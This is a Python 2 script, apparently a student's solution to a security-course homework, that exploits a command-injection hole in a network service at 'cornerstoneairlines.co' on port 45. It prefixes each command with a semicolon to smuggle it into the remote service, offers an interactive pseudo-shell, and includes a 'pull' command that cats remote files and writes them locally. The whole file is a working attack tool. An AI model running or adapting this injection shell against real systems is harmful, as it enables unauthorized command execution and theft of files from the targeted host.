"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    #print("Entering execute_cmd:" + cmd)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024);
    commandLine = ";" + cmd + '\n'
    s.send(commandLine)
    data = s.recv(1024)
    print(data)
    return data

if __name__ == '__main__':
    while (1):
            cmd = raw_input(">").strip().split()
            if cmd[0] == "shell":
                attachDirectory = ""
                while (1):
                    shellcmd = raw_input("\>")
                    splitcmd = shellcmd.strip().split()
                    if shellcmd == "exit":
                        print("Exitting shell")
                        break;
                    elif splitcmd[0] == "cd":
                        if len(splitcmd) == 1:
                            attachDirectory = ""
                        attachDirectory = "cd " + splitcmd[1] +";"
                        execute_cmd(shellcmd)
                       #print(shellcmd)
                    else:
                        #print("executing shellcode " + attachDirectory + shellcmd)
                        execute_cmd(attachDirectory + shellcmd)
            elif cmd[0] == "pull":
                if not len(cmd) == 3:
                    print("Invalid pull. Enter help for more detail")
                else:
                    data = execute_cmd(attachDirectory + "cat " + cmd[1])
                    print("recvd:" + data)
                    open(cmd[2], "w+").write(data)
            elif cmd[0] == "help":
                print("1. shell Drop into an interactive shell and allow users to gracefully exit")
                print("2. pull <remote-path> <local-path> Download files")
                print("3. help Shows this help menu")
                print("4. quit Quit the shell")
            elif cmd[0] == "quit":
                print("Exitting")
                break;
            else:
                print("Invalid command. Enter help for more detail")
